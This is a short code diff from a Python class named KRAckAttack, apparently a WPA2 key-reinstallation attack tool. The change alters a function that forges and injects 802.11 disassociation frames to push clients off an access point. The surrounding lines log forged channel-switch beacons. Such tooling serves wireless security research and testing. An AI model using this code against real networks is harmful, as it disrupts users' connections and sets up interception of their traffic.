@@ -494,8 +494,9 @@ class KRAckAttack():
 		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")
 
 	def send_disas(self, macaddr):
-		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
-		self.sock_rogue.send(p)
+		dot11 = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)
+		disas = RadioTap()/dot11/Dot11Disas(reason=0)
+		self.sock_rogue.send(disas)
 		log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")
 
 	def queue_disas(self, macaddr):
